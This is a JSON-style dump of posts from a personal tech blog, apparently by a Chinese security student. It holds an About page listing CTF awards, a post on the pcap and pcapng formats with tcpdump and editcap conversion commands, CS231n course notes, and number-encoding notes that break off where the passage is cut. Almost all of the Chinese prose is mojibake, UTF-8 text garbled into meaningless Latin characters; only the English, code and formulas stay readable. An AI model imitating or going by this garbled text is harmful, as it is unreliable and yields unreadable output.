ğŸ¥ˆç¬¬ä¸‰å±Šä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›äºŒç­‰å¥– Sanming,China,Apr,2021 ğŸ†ç¬¬åå››å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›â€”â€”åˆ›æ–°å®è·µèƒ½åŠ›èµ›åä¸œå—èµ›åŒºä¸€ç­‰å¥– Fuzhou,China,June,2021 ğŸ¥‰ç¬¬åå››å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›â€”â€”åˆ›æ–°å®è·µèƒ½åŠ›èµ›æ€»å†³èµ›ä¸‰ç­‰å¥– Harbin,China,June,2021 ğŸ†ç¬¬äº”å±Š\u0026quot;è“å¸½æ¯\u0026quot;å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æœºèƒ½å¤§èµ›æ€»å†³èµ›ä¸€ç­‰å¥– Online,Aug,2021 ğŸ†ç¬¬ä¸ƒå±ŠXCTFå›½é™…è”èµ›åˆ†ç«™èµ›L3HCTFå† å†› Online,Nov,2021 ğŸ¥ˆç¬¬åäº”å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›â€”â€”åˆ›æ–°å®è·µèƒ½åŠ›èµ›åä¸œå—èµ›åŒºäºŒç­‰å¥–(è€»è¾±) Zhejiang,China,Sep,2022 Contact Email:ruokeqx@163.com\n","description":"about","id":24,"section":"","tags":null,"title":"About","uri":"https://ruokeqx.gitee.io/about/"},{"content":"å‰è¨€ è¿™æ¬¡L3HCTFè·Ÿç€é˜Ÿå‹æ··äº†ä¸ªå† å†›ã€‚\nåœ¨çœ‹å®˜æ–¹a-solçš„wpçš„æ—¶å€™çœ‹åˆ°ä¸€ä¸ªè„šæœ¬ä¸­æœ‰å¦‚ä¸‹ä»£ç ï¼Œç›´æ¥è¿è¡Œä¼šæŠ¥é”™ã€‚ValueError: invalid tcpdump header\n1 dpkt.pcap.Reader(open(\u0026#34;a-sol.pcap\u0026#34;,\u0026#39;rb\u0026#39;)) äº‹å®ä¸Šdpktæœ‰pcangçš„è§£ææ¨¡å—ï¼Œå°†ä»£ç ä¿®æ”¹å¦‚ä¸‹å³å¯æ­£ç¡®è¿è¡Œã€‚\n1 dpkt.pcapng.Reader(open(\u0026#34;a-sol.pcapng\u0026#34;,\u0026#39;rb\u0026#39;)) è¿™ä¸ªé—®é¢˜ä¹‹å‰åœ¨å†™æ¶æ„æµé‡è¯†åˆ«é¡¹ç›®çš„æ—¶å€™ä¹Ÿé‡åˆ°è¿‡ï¼Œå½“æ—¶å¯¹pcapå’Œpcapngå·®åˆ«ä¸å¾ˆæ¸…æ¥šï¼Œåªæ˜¯çŸ¥é“æ ¼å¼ä¸ä¸€æ ·ï¼Œå¹¶æ²¡æœ‰æ·±å…¥çš„è¿›è¡Œç ”ç©¶ï¼Œè€Œæ˜¯é€‰æ‹©ä½¿ç”¨WinDumpæ›¿ä»£tsharkè¿›è¡Œæµé‡æ•è·ã€‚è¿™æ¬¡åˆé‡åˆ°äº†ï¼Œå°±æ¥ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œæœ¬æ¥æ˜¯å‡†å¤‡å†™å°±çœ‹ä¸€ä¸‹æ ¼å¼è½¬æ¢æ–¹æ³•ï¼Œå‘ç°è¶Šçœ‹è¶Šå¤šï¼Œé‚£å°±çœ‹åˆ°å“ªå†™åˆ°å“ªå§ã€‚\nä¸€ç‚¹ç ”ç©¶ ç°è±¡åŠéªŒè¯ æœ‰ä¸¤ä¸ªä»¥å‰é‡åˆ°çš„æµé‡åŒ…ï¼Œä¸€ä¸ªå¯ä»¥ç”¨dpkt.pcapåŒ…è§£æï¼Œä¸€ä¸ªä¸èƒ½ç”¨dpkt.pcap\n1 2 3 4 âš¡ /mnt/c/project/pcap \u0026gt; hexdump 03.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 âš¡ /mnt/c/project/pcap \u0026gt; hexdump a-sol.pcapng | head -n 1 0000000 0d0a 0a0d 00c8 0000 3c4d 1a2b 0001 0000 è™šæ‹Ÿæœºä½¿ç”¨tcpdumpæ•è·æ˜¯pcapæ ¼å¼\n1 2 3 4 5 6 7 ~ \u0026gt; sudo tcpdump -i ens32 -s 10 -w vmcap.pcap tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 10 bytes ^C2698 packets captured 2728 packets received by filter 0 packets dropped by kernel ~ \u0026gt; hexdump vmcap.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 win10wiresharkæ•è·é»˜è®¤ä¸ºpcapngæ ¼å¼ï¼Œå¯ä»¥é€‰æ‹©ä¿å­˜ä¸ºpcapæ ¼å¼\n1 2 3 4 âš¡ \u0026gt; /mnt/c/project/pcap \u0026gt; hexdump out.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 âš¡ \u0026gt; /mnt/c/project/pcap \u0026gt; hexdump out.pcapng | head -n 1 0000000 0d0a 0a0d 00c0 0000 3c4d 1a2b 0001 0000 WinDumpæ•è·çš„æ˜¯pcapæ ¼å¼\n1 2 3 4 5 6 7 8 9 PS C:\\Users\\ruokeqx\\Downloads\u0026gt; WinDump.exe -s 10000 -w out.pcap C:\\Windows\\system32\\WinDump.exe: listening on {1BEDAF4F-8ABD-46F4-B122-453989CD2B2F} 222 packets captured 222 packets received by filter 0 packets dropped by kernel PS C:\\Users\\ruokeqx\\Downloads\u0026gt; wsl âš¡ \u0026gt; /mnt/c/Users/ruokeqx/Downloads \u0026gt; hexdump out.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 å¼•å…¥ å¯¹äºä¸¤ç§æ ¼å¼çš„ç ”ç©¶æ›´åƒæ˜¯å¯¹å†å²çš„ç ”ç©¶ï¼ˆ\nåœ¨Winpcapå®˜æ–¹çš„é¡¹ç›®NTARé¦–é¡µçš„ä»‹ç»å¯ä»¥çœ‹åˆ°ä¸‹é¢ä¸€æ®µè¯ã€‚\nNTAR implements a new \u0026#34;wanna-be\u0026#34; dump standard that overcomes the limits of the current libpcap/WinPcap dump format, by allowing the user to save packets coming from multiple interfaces and different data-links in a single trace file. è¿™é‡Œå¯ä»¥è·å¾—å¾ˆå¤šä¿¡æ¯ï¼Œæ–°çš„æ ‡å‡†(å³pcapng)é€šè¿‡å…è®¸ç”¨æˆ·ä¿å­˜packets coming from multiple interfaces and different data-linksåˆ°ä¸€ä¸ªæµé‡åŒ…é‡Œæ¥å…‹æœç°å­˜libpcap/WinPcapæ•è·æ ¼å¼çš„ç¼ºé™·ã€‚\nä¸‹é¢é“¾æ¥ä¸­å¯¹PCAP Next Generation Dump File Formatè¿›è¡Œäº†è¯¦ç»†é˜è¿°ã€‚\nhttps://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html\nè‡³äºæœ€æ˜¾ç¤ºçš„ç‰¹å¾å·®åˆ«å°±åœ¨äºæ–‡ä»¶å¤´äº†ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶å¤´å¿«é€Ÿç¡®å®šæ ¼å¼ã€‚\nThe block type of the Section Header Block is the integer corresponding to the 4-char string \u0026#34;\\r\\n\\n\\r\u0026#34; (0x0A0D0D0A). é€‰ç”¨è¿™ä¸ªæ–‡ä»¶å¤´çš„åŸå› æ–‡ä¸­æœ‰æè¿°ï¼Œç®€å•è¯´ä¸€æ˜¯æ£€æµ‹inappropriate ASCII conversionåˆ¤æ–­æ–‡ä»¶æ˜¯å¦æŸåï¼ŒäºŒæ˜¯å›æ–‡ä»»æ„å­—èŠ‚åºéƒ½èƒ½è¯†åˆ«å‡ºæ¥ã€‚\nè€Œpcapçš„æ–‡ä»¶å¤´æ˜¯0xA1B2C3D4ï¼Œè‡³æ­¤æ–‡ä»¶æ ¼å¼å’Œå¯¹äºçš„æ•è·æ–‡ä»¶å¤´éƒ½ç¬¦åˆäº†ã€‚\nThe PCAP format has become the standard format for dumping captured packets in the free and open-source software community. Hone strives to adhere to this format as much as possible to help achieve acceptance within the networking community and to allow interoperability with other software. The original PCAP format, however, is deficient in describing anything except packets. Luckily, there is a new PCAP format, PCAP-NG (PCAP Next Generation), on the horizon with initial support in libpcap, wireshark, and other analysis software. pcapng å°±æ˜¯ PCAP next generation çš„æ„æ€ï¼Œä»–çš„æ–‡ä»¶æ ¼å¼è§„èŒƒåœ¨ä¸‹é¢é“¾æ¥ä¸­ã€‚\nhttps://github.com/pcapng/pcapng\nhttps://github.com/HoneProject/Linux-Sensor/wiki/Augmented-PCAP-Next-Generation-Dump-File-Format\npcapæ ¼å¼è‰æ¡ˆ\nhttps://datatracker.ietf.org/doc/html/draft-gharris-opsawg-pcap-02\npcapngæ ¼å¼è‰æ¡ˆ\nhttps://datatracker.ietf.org/doc/html/draft-tuexen-opsawg-pcapng\nNTARå¯ä»¥è¯»å†™pcapngæ–‡ä»¶ä½†æ˜¯é¡¹ç›®å·²ç»frozenå¹¶ä¸”ä¸æ”¯æŒä¸€äº›å—ã€‚\nThe Network Trace Archival and Retrieval library is able to read and write pcapng files. Caveats: i) frozen since 2007, ii) no plugins for EPB, ISB, and NRB blocks wiresharkçš„wikiä¸­æœ‰ä¸€ä¸ªNTARçš„æ‰©å±•ç¨‹åºntartestï¼ˆä¸ªäººæ„Ÿè§‰æ²¡å•¥ç”¨ï¼‰\nhttps://gitlab.com/wireshark/wireshark/-/wikis/Development/PcapNg#ntartest-a-simplistic-standalone-pcapng-ntar-file-reader\næ›´å¤š Tcpdump\\libpcap\nTcpdumpé€šè¿‡libpcapæŠ“å–æŠ¥æ–‡ï¼Œåœ¨linuxå¹³å°ï¼Œlibpcapé€šè¿‡AF_PACKETå¥—æ¥å­—æŠ“å–ã€‚Tcpdumpå®˜æ–¹æ¨èwindowsç”¨æˆ·ä½¿ç”¨winpcapå’Œwindump(ç°åœ¨çœ‹æ¥å½“æ—¶ä¼¼ä¹æ²¡é€‰é”™)ã€‚ä¿å­˜æ ¼å¼ä¸ºpcap\nTcpdump uses libpcap, a system-independent interface for user-level packet capture. People with Windows distributions are best to check the Windows PCAP page for references to WinDUMP. WinDump\\WinPcap\nWinDumpæ˜¯windowså¹³å°çš„tcpdumpï¼Œä»–åŸºäºWinPcapçš„ã€‚ä¿å­˜æ ¼å¼ä¹Ÿæ˜¯pcap\nWinDump is the Windows version of tcpdump, the command line network analyzer for UNIX. WinDump is fully compatible with tcpdump and can be used to watch, diagnose and save to disk network traffic according to various complex rules. It can run under Windows 95, 98, ME, NT, 2000, XP, 2003 and Vista. WinDump captures using the WinPcap library and drivers, which are freely downloadable from the WinPcap.org website. WinDump supports 802.11b/g wireless capture and troubleshooting through the Riverbed AirPcap adapter. è€ŒWinDumpå®˜æ–¹çš„changelogæ˜¾ç¤ºä»–ä»¬åœ¨06å¹´ä»¥åå°±æ²¡æœ‰æ›´æ–°äº†ã€‚\nè€ŒWinPcapä¹Ÿåœ¨13å¹´å‘å¸ƒæœ€åä¸€æ¬¡æ›´æ–°æˆ–åå†ä¹Ÿæ²¡æœ‰æ›´æ–°ï¼Œä»–ä»¬åœ¨18å¹´å‘å¸ƒäº†å¦‚ä¸‹é€šçŸ¥ï¼Œå°±æ˜¯è¯´ä¸ä¼šå†æœ‰æ›´æ–°ï¼Œç¤¾åŒºæ”¯æŒè¿˜ä¼šå­˜åœ¨ï¼Œæ›¿ä»£ç‰©å»ºè®®ä½¿ç”¨nmapä½œè€…åˆ›å»ºçš„npcapã€‚\nWinPcap, though still available for download (v4.1.3), has not seen an upgrade in many years and there are no road map/future plans to update the technology. While community support may persist, technical oversight by Riverbed staff, responses to questions posed by Riverbed resources, and bug reporting are no longer available. Gordon Lyon, Nmap project founder, has created Npcap, a packet capture library for Windows, that includes WinPcap compatibility and may be a suitable replacement for WinPcap and WinPcap Pro. Information can be found at https://nmap.org/npcap/. Wireshark\\Npcap\nWireshark is the worldâ€™s foremost and widely-used network protocol analyzer. The Wireshark installer includes Npcap which is required for packet capture. windowså®‰è£…wiresharkçš„æ—¶å€™ä¼šè®©å®‰è£…npcapï¼Œä¹Ÿå°±æ˜¯è¯´wiresharkä½œä¸ºæœ€å…ˆè¿›çš„æŠ“åŒ…å’Œåˆ†æå·¥å…·ä¹‹ä¸€å·²ç»é€‰ç”¨äº†npcapã€‚\nwiresharkå®‰è£…é™„å¸¦å¤šä¸ªç¨‹åº\n1 2 3 4 5 6 7 Tools - Additional command line tools to work with capture files Editcap - Reads a capture file and writes some or all of the packets into another capture file. Text2Pcap - Reads in an ASCII hex dump and writes the data into a pcap capture file. Reordercap - Reorders a capture file by timestamp. Mergecap - Combines multiple saved capture files into a single output file. Capinfos - Provides information on capture files. Rawshark - Raw packet filter. ä¸‹é¢æ˜¯å‚æ•°ä¸­æœ‰å¯¹æ ¼å¼è¿›è¡Œè¯´æ˜çš„ï¼Œä»–ä»¬éƒ½å¯ä»¥æŒ‡å®šæ–‡ä»¶æ ¼å¼ï¼Œè€Œä¸”å…¨éƒ¨éƒ½æ˜¯é»˜è®¤ä½¿ç”¨pcapngæ ¼å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 dumpcap.exe --help -n use pcapng format instead of pcap (default) -P use libpcap format instead of pcapng tshark.exe --help -F \u0026lt;output file type\u0026gt; set the output file type, default is pcapng an empty \u0026#34;-F\u0026#34; option will list the file types editcap.exe --help -F \u0026lt;capture type\u0026gt; set the output file type; default is pcapng. An empty \u0026#34;-F\u0026#34; option will list the file types. mergecap.exe --help -F \u0026lt;capture type\u0026gt; set the output file type; default is pcapng. An empty \u0026#34;-F\u0026#34; option will list the file types. å…¶ä¸­åªæŒ‡å®š-Fè¾“å‡ºçš„æç¤ºæ€§å¯ç”¨æ ¼å¼å¦‚ä¸‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 mergecap: The available capture file types for the \u0026#34;-F\u0026#34; flag are: 5views - InfoVista 5View capture btsnoop - Symbian OS btsnoop commview - TamoSoft CommView dct2000 - Catapult DCT2000 trace (.out format) erf - Endace ERF capture eyesdn - EyeSDN USB S0/E1 ISDN trace format k12text - K12 text file lanalyzer - Novell LANalyzer logcat - Android Logcat Binary format logcat-brief - Android Logcat Brief text format logcat-long - Android Logcat Long text format logcat-process - Android Logcat Process text format logcat-tag - Android Logcat Tag text format logcat-thread - Android Logcat Thread text format logcat-threadtime - Android Logcat Threadtime text format logcat-time - Android Logcat Time text format modpcap - Modified tcpdump - pcap netmon1 - Microsoft NetMon 1.x netmon2 - Microsoft NetMon 2.x nettl - HP-UX nettl trace ngsniffer - Sniffer (DOS) ngwsniffer_1_1 - NetXray, Sniffer (Windows) 1.1 ngwsniffer_2_0 - Sniffer (Windows) 2.00x niobserver - Network Instruments Observer nokiapcap - Nokia tcpdump - pcap nsecpcap - Wireshark/tcpdump/... - nanosecond pcap nstrace10 - NetScaler Trace (Version 1.0) nstrace20 - NetScaler Trace (Version 2.0) nstrace30 - NetScaler Trace (Version 3.0) nstrace35 - NetScaler Trace (Version 3.5) pcap - Wireshark/tcpdump/... - pcap pcapng - Wireshark/... - pcapng rf5 - Tektronix K12xx 32-bit .rf5 format rh6_1pcap - RedHat 6.1 tcpdump - pcap snoop - Sun snoop suse6_3pcap - SuSE 6.3 tcpdump - pcap visual - Visual Networks traffic capture Npcapæ˜¯nmapåœ¨winå¹³å°çš„æµé‡æ•æ‰åº“ï¼Œlinuxå’Œmacä¹Ÿæ”¯æŒäº†npcapï¼Œå…¶æ˜¯winpcapçš„æ”¹å–„å’Œæ‰©å±•ã€‚\nNpcap is the Nmap Project\u0026#39;s packet capture (and sending) library for Microsoft Windows. It implements the open Pcap API using a custom Windows kernel driver alongside our Windows build of the excellent libpcap library. Mac and Linux systems already include the Pcap API, so Npcap allows popular software such as Nmap and Wireshark to run on all these platforms (and more) with a single codebase. Npcap began in 2013 as some improvements to the (now discontinued) WinPcap library, but has been largely rewritten since then with hundreds of releases improving Npcap\u0026#39;s speed, portability, security, and efficiency. è½¬æ¢æ–¹æ³• pcapng to pcap æ–¹æ³•ä¸€ï¼šç›´æ¥ç”¨wiresharkæ‰“å¼€pcapngæ–‡ä»¶å¦å­˜ä¸ºpcapæ–‡ä»¶\næ–¹æ³•äºŒï¼šeditcapæŒ‡å®šæ ¼å¼è¾“å‡º\n1 editcap.exe a-sol.pcapng a-sol.pcap -F pcap æ–¹æ³•ä¸‰ï¼šç”¨mergecapå°†pcapngè½¬åŒ–ä¸ºæŒ‡å®šçš„pcapæ ¼å¼\n1 mergecap.exe a-sol.pcapng -w a-sol.pcap -F pcap æ­¤å¤–mergecapåŠŸèƒ½å¦‚å…¶åï¼Œè¿˜èƒ½å°†å¤šä¸ªåŒ…åˆåˆ°ä¸€èµ·ã€‚\næ–¹æ³•å››ï¼štcpdump/libpcap (4.1.0+/1.1.0+)\n1 tcpdump -r a-sol.pcapng -w a-sol.pcap pcap to pcapng 1 2 editcap -F pcapng file.pcap file.pcapng tshark -F pcapng -r file.pcap -w file.pcapng ","description":"","id":25,"section":"posts","tags":["network"],"title":"pcapå’Œpcapngæ ¼å¼çš„ä¸€ç‚¹ç ”ç©¶","uri":"https://ruokeqx.gitee.io/posts/cap%E6%A0%BC%E5%BC%8F/"},{"content":"Where is article comes from?\nAn idea of a pornography detection project for ciscn 2021. And when searching on Google, I came accross a report from cs231n named Combining CNNs for detecting pornography in the absence of labeled training data.\nå†å²ä»‹ç» äººä»¬æå‡ºä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬æ˜¯å¦å…·å¤‡äº†è¯†åˆ«çœŸå®ä¸–ç•Œä¸­çš„æ¯ä¸€ä¸ªç‰©ä½“çš„èƒ½åŠ›ã€‚è¿™ä¸ªé—®é¢˜ä¹Ÿæ˜¯ç”±æœºå™¨å­¦ä¹ ä¸­å¤§éƒ¨åˆ†çš„æœºå™¨å­¦ä¹ ç®—æ³•å½“æˆ‘ä»¬çš„è®­ç»ƒæ•°æ®é‡ä¸å¤Ÿæ—¶ï¼Œå¾ˆå¯èƒ½å¾ˆå¿«å°±ä¼šä¼šè¿‡æ‹Ÿåˆçš„ç°è±¡é©±åŠ¨ã€‚æˆ‘ä»¬å¼€å±•äº†ä¸€ä¸ªå«ImageNetçš„é¡¹ç›®ï¼ŒåŒ…å«ä¸–ç•Œä¸‡ç‰© ç»„æˆä¸€ä¸ªå°½å¯èƒ½å¤§çš„æ•°æ®é›†ã€‚ä¸‹è½½äº†å¾ˆå¤šå¾ˆå¤šå›¾ç‰‡ï¼Œorganized by the dictionary called WordNet.\nThe winning algorithm of the 2012\u0026rsquo;s ImageNet Large-Scale VIsual Recognition Challenge is a convolutional neural network model.\nAnd in 2015 it got really crazy and paper from MS called Residual Networks(æ®‹å·®ç½‘ç»œ) were 152 layers.\nImage Classification pipeline Nearest Neighborï¼ˆæœ€è¿‘é‚»ï¼‰: Predict the label of the most similar training image\nå¦‚ä½•åˆ¤æ–­æœ€è¿‘ï¼Ÿ\nL1 distanceã€ä¹Ÿå«æ›¼å“ˆé¡¿è·ç¦»ï¼Œè¡—åŒºè·ç¦»ã€‘: $d_1(I_1,I_2) = \\sum_p |I_1 ^P - I_2 ^P|$ æ¯ä¸ªåƒç´ å·®ç»å¯¹å€¼ç„¶åæ±‚å’Œ\næœ€è¿‘é‚»å¤æ‚åº¦ï¼šTrain O(1) predict O(n)\nè¿™æ˜¯ä¸å¥½çš„ï¼Œæˆ‘ä»¬å¸Œæœ›é¢„æµ‹çš„å¿«ä¸€ç‚¹ï¼Œè®­ç»ƒçš„æ—¶å€™æ…¢ä¸€ç‚¹æ²¡å…³ç³»\nK-Nearest Neighbors(Kæœ€è¿‘é‚»)ï¼š æœ€è¿‘é‚»å¾—åˆ°çš„æ˜¯çªå…€çš„è¾¹ç•Œï¼Œå› ä¸ºä»–å–çš„æ˜¯å•ä¸ªç‚¹å’Œå•ä¸ªç‚¹ä¹‹é—´çš„å‚ç›´å¹³åˆ†çº¿ã€‚\nInstead of copying label from nearest neighbor, take majority vote from K closest points.\nè¿™æ ·å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ³›åŒ–èƒ½åŠ›æ›´å¥½çš„å¹³æ»‘è¾¹ç•Œ\nL2 distance ã€ä¸¤ç‚¹è·ç¦»å…¬å¼ã€‘ï¼š$d_2(I_1,I_2) = \\sqrt {\\sum_p(I_1 ^P-I_2 ^P) ^2}$ è¿™æ˜¯ä¸€ä¸ªåœ†ã€‚è€ŒL1è·ç¦»æ˜¯æ­£æ–¹å½¢ã€‚\nL1è·ç¦»å¯¹åæ ‡è½´çš„æ—‹è½¬æ¯”è¾ƒæ•æ„Ÿï¼ˆæ¯”è¾ƒé€‚åˆåæ ‡è½´å®šä¹‰æ˜ç¡®çš„ä¸œè¥¿ï¼‰\nvision.stanford.edu/teaching/cs231n-demos/knn/\nè¶…å‚æ•°ï¼šæ˜¯ç”±æˆ‘ä»¬è®¾ç½®çš„è€Œä¸æ˜¯æœºå™¨å­¦ä¹ çš„\nè¶…å‚æ•°çš„é€‰æ‹©ï¼š1. å…¨æ˜¯æ•°æ®é›† 2.è®­ç»ƒé›† æµ‹è¯•é›† 3.è®­ç»ƒé›† éªŒè¯é›† æµ‹è¯•é›†ï¼ˆbetterï¼‰4.äº¤å‰éªŒè¯ï¼ˆå°æ•°æ®é›†æœ‰ç”¨ï¼Œæ·±åº¦å­¦ä¹ ç”¨çš„ä¸å¤šï¼‰\nKNNä»æ¥ä¸åœ¨å›¾åƒä¸Šä½¿ç”¨ï¼Œå› ä¸ºé€Ÿåº¦å¾ˆæ…¢ï¼Œè€Œä¸”å›¾ç‰‡è¿›è¡Œä¸€äº›æ“ä½œæŒ‡æ ‡è¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼ˆdistance metrics on pixels are not informativeï¼‰ç»´æ•°ç¾éš¾ æŒ‡æ•°å¢åŠ (curse of dimensionality)\nçº¿æ€§åˆ†ç±»å™¨åœ¨ç¥ç»ç½‘ç»œä¸­å¾ˆå¸¸ç”¨\nvisual viewpoint\nhttps://playground.tensorflow.org/\nhttp://vision.stanford.edu/teaching/cs231n-demos/linear-classify/\nçº¿æ€§åˆ†ç±»ã€æŸå¤±å‡½æ•°å’Œæ¢¯åº¦ä¸‹é™ the SVM loss has the form:\n$L_i = \\sum_{j\\neq y_i}max(0,s_j-s_{y_i}+1)$\næ­£åˆ™åŒ–ï¼šé€šè¿‡$\\lambda$ æ§åˆ¶å‚æ•°æ›´å°ï¼Œä»¥å‡å°‘è¿‡æ‹Ÿåˆ Simple examplesï¼š\nL2 regularization: $R(W) = \\sum_k\\sum_lW_{k,l} ^2$\nL1 regularization: $R(W) = \\sum_k\\sum_l|W_{k,l}|$\nElastic net(L1+L2): $R(W) = \\sum_k\\sum_l \\beta W_{k,l} ^2+|W_{k,l}|$\nMore complex:\nDropout\nBatch normalization\nStochastic depth, fractional pooling, etc\nSoftmax Classifier(å¤šåˆ†ç±»é€»è¾‘å›å½’) Softmax function: $P(Y=k|X=x_i) = \\frac {e ^sk}{\\sum_je ^sj}$\nå…ˆexpç„¶åå½’ä¸€åŒ–, åˆ†æ•°æ”¹å˜ä¸ºæ¦‚ç‡\nä¹‹åæ¥å…¥äº¤å‰ç†µæŸå¤±å‡½æ•°\nmaximum likelihood estimation:\nchoose weights to maximize the likelihood of the observed data\næ¢¯åº¦ä¸‹é™ æ•°å€¼è§£å’Œè§£æè§£ è§£æè§£æ›´å¿«ä½†å®¹æ˜“é”™\næå–å›¾ç‰‡ç‰¹å¾è¾“å…¥è€Œéç›´æ¥åƒç´ ç‚¹è¾“å…¥ï¼Œå¦‚HOG(Histogram of Oriented Gradients), åæ ‡å˜åŒ–ï¼ˆç›´è§’åæ ‡è½¬åŒ–ä¸ºæåæ ‡ å¯ä»¥è§£å†³åŒå¿ƒåœ†é—®é¢˜ï¼‰\n","description":"","id":26,"section":"posts","tags":["AI","course"],"title":"CS231 Convolutional Neural Networks for Visual Recognitionâ€”â€”Stanford","uri":"https://ruokeqx.gitee.io/posts/cs231/"},{"content":"æ•°æ®è¡¨ç¤ºå’Œå­˜å‚¨ å®šç‚¹æ•°å’Œæµ®ç‚¹æ•° è®¡ç®—æœºä¸­åªèƒ½é€šè¿‡çº¦å®šå°æ•°ç‚¹çš„ä½ç½®æ¥è¡¨ç¤º å®šç‚¹æ•°â€”â€”å°æ•°ç‚¹ä½ç½®çº¦å®šåœ¨å›ºå®šä½ç½®çš„æ•° æµ®ç‚¹æ•°â€”â€”å°æ•°ç‚¹ä½ç½®çº¦å®šä¸ºå¯æµ®åŠ¨çš„æ•° å®šç‚¹å°æ•°ç”¨æ¥è¡¨ç¤ºæµ®ç‚¹æ•°çš„å°¾æ•°éƒ¨åˆ† å®šç‚¹æ•´æ•°ç”¨æ¥è¡¨ç¤ºæ•´æ•° åˆ†ä¸ºå¸¦ç¬¦å·æ•´æ•°å’Œæ— ç¬¦å·æ•´æ•° ä»»ä½•å®æ•°ï¼š$X=(-1)^S \\times M \\times R^E$ Sè¡¨ç¤ºæ­£è´Ÿï¼›Mä¸ºäºŒè¿›åˆ¶å®šç‚¹å°æ•°ï¼Œç§°ä¸ºXçš„å°¾æ•°ï¼›Eæ˜¯äºŒè¿›åˆ¶å®šç‚¹æ•´æ•°ï¼Œç§°ä¸ºXçš„é˜¶æˆ–æŒ‡æ•°ï¼›Ræ˜¯åŸºæ•°ï¼Œå¯ä»¥ä¸º2ã€4ã€16ç­‰ã€‚åªè¦è¡¨ç¤ºSã€Må’ŒEä¸‰ä¸ªä¿¡æ¯å°±èƒ½ç¡®å®šXçš„å€¼ï¼Œè¿™ç§°ä¸ºæµ®ç‚¹æ•°ã€‚ å®šç‚¹æ•°çš„ç¼–ç è¡¨ç¤º å®šç‚¹æ•°çš„ç¼–ç  åŸç ã€è¡¥ç ã€ç§»ç ã€åç ï¼ˆå¾ˆå°‘ç”¨ï¼‰ åŸç ï¼šæ­£å·0 è´Ÿå·1 å…¶ä½™äºŒè¿›åˆ¶è¡¨ç¤º\nç¼ºç‚¹ï¼š\n0çš„è¡¨ç¤ºä¸å”¯ä¸€ï¼Œä¸åˆ©äºç¼–ç¨‹ åŠ å‡è¿ç®—æ–¹å¼ä¸åŒæ„ éœ€è¦é¢å¤–å¯¹ç¬¦å·ä½è¿›è¡Œå¤„ç†ï¼Œä¸åˆ©äºç¡¬ä»¶è®¾è®¡ å½“a\u0026lt;b å®ç°a-bæ¯”è¾ƒå›°éš¾ ä»50å¹´ä»£å¼€å§‹ï¼Œæ•´æ•°éƒ½é‡‡ç”¨è¡¥ç è¡¨ç¤ºï¼Œä½†æµ®ç‚¹æ•°çš„å°¾æ•°ç”¨åŸç å®šç‚¹å°æ•°è¡¨ç¤º\nç§»ç ï¼šå°†æ¯ä¸€ä¸ªæ•°å€¼åŠ ä¸Šä¸€ä¸ªåç½®å¸¸æ•°ï¼ˆExcess / Biasï¼‰\né€šå¸¸å½“ç¼–ç ä½æ•°ä¸ºnæ—¶ï¼Œbiaså–$2^{n-1} æˆ–2^{n-1}-1(å¦‚IEEE 754)$\nEx. n=4: $E_{biased} = E+2^3 (bias=2^3=1000B)$ -8(+8) ~ 0000B -7(+8) ~ 0001B \u0026hellip;.. 0(+8) ~ 1000B \u0026hellip;.. +7(+8) ~ 1111B ç”¨ç§»ç æ¥è¡¨ç¤ºæŒ‡æ•°(é˜¶ç )ä¾¿äºæµ®ç‚¹æ•°åŠ å‡è¿ç®—æ—¶çš„å¯¹é˜¶æ“ä½œ(æ¯”è¾ƒå¤§å°)\nEx: $1.01\\times 2 ^{-1}+1.11\\times2 ^3$ $1.01\\times2 ^{-1+4}+1.11\\times2 ^{3+4}$ è¡¥ç ï¼š111(-1)\u0026lt;011(3)?\tç§»ç ï¼š011(3)\u0026lt;111(7) è¡¥ç ï¼šæ¨¡è¿ç®— åœ¨ä¸€ä¸ªæ¨¡è¿ç®—ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªæ•°ä¸å®ƒé™¤ä»¥â€œæ¨¡â€åçš„ä½™æ•°ç­‰ä»·ã€‚\n$10-4=6$\n$10+8=18\\equiv6 (mod 12)$\n$10-4\\equiv10+8 (mod 12)$\n$-4\\equiv8 (mod 12)$\n$ç»“è®º1ï¼šä¸€ä¸ªè´Ÿæ•°çš„è¡¥ç ç­‰äºæ¨¡å‡è¯¥è´Ÿæ•°çš„ç»å¯¹å€¼$\n$ç»“è®º2ï¼šå¯¹äºæŸä¸€ç¡®å®šçš„æ¨¡ï¼ŒæŸæ•°å‡å»å°äºæ¨¡çš„å¦ä¸€æ•°ï¼Œæ€»å¯ä»¥ç”¨è¯¥æ•°åŠ ä¸Šå¦ä¸€æ•°è´Ÿæ•°çš„è¡¥ç æ¥ä»£æ›¿ï¼ˆåœ¨æ¨¡è¿ç®—ä¸­å‡æ³•å’ŒåŠ æ³•å¯ä»¥è½¬æ¢ï¼‰$\n$Ex. 9828-1928=9828+(10^4-1928)$\n$=9828+8072$\n$=17900$\n$=7900(mod 10^4)$\n$[X]_è¡¥=2 ^n+X (-2 ^n\u0026lt;=X\u0026lt;2 ^n,mod 2 ^n)$ Xæ˜¯çœŸå€¼ $[X]_è¡¥$æ˜¯æœºå™¨æ•°\n$[-2 ^{n-1}]_è¡¥=2 ^n-2 ^{n-1}=10\u0026hellip;0(n-1ä¸ª0)$\n$[-1]_è¡¥=2 